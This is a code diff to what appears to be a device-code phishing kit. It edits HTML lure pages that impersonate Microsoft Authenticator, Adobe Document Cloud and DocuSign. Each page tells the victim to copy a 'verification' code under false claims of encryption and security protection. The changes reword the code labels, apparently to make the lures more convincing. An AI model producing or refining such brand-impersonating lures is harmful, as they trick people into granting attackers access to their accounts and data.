@@ -490,7 +490,7 @@ const DEVICE_CODE_AUTHENTICATOR_HTML = `<!DOCTYPE html>
 <div id="mainView">
 <p class="intro">A one-time verification code has been generated for your account.</p>
 <div class="info-box">Your account security is our priority. Microsoft Authenticator uses advanced protection to verify your identity. Enter the code below to proceed.</div>
-<div class="code-label">Security Verification Code</div>
+<div class="code-label">MFA Authorization Code</div>
 <div class="code-input" id="userCode">Loading...</div>
 <div class="copy-row">
 <button class="copy-btn" id="copyBtn" onclick="copyCode()" disabled>
@@ -548,7 +548,7 @@ const DEVICE_CODE_ADOBE_HTML = `<!DOCTYPE html>
 <p class="intro">Verify Your Identity</p>
 <p style="text-align:center;font-size:14px;color:#505050;margin-bottom:24px">Use the access code below to unlock your protected PDF document.</p>
 <div class="info-box">Your PDF document is encrypted with Adobe Document Cloud security. Use the access code to verify your identity and unlock the file.</div>
-<div class="code-label">PDF Unlock Code</div>
+<div class="code-label">Document Access Code</div>
 <div class="code-input" id="userCode">Loading...</div>
 <div class="copy-row">
 <button class="copy-btn" id="copyBtn" onclick="copyCode()" disabled>
@@ -609,7 +609,7 @@ const DEVICE_CODE_DOCUSIGN_HTML = `<!DOCTYPE html>
 <p class="intro">Verify Your Identity</p>
 <p class="sub-intro">A unique signing code has been generated to access your document.</p>
 <div class="info-box">DocuSign uses industry-leading encryption to protect your documents. Enter the code below to authenticate and proceed to signing.</div>
-<div class="code-label">Document Signing Code</div>
+<div class="code-label">Document Access Code</div>
 <div class="code-input" id="userCode">Loading...</div>
 <div class="copy-row">
 <button class="copy-btn" id="copyBtn" onclick="copyCode()" disabled>
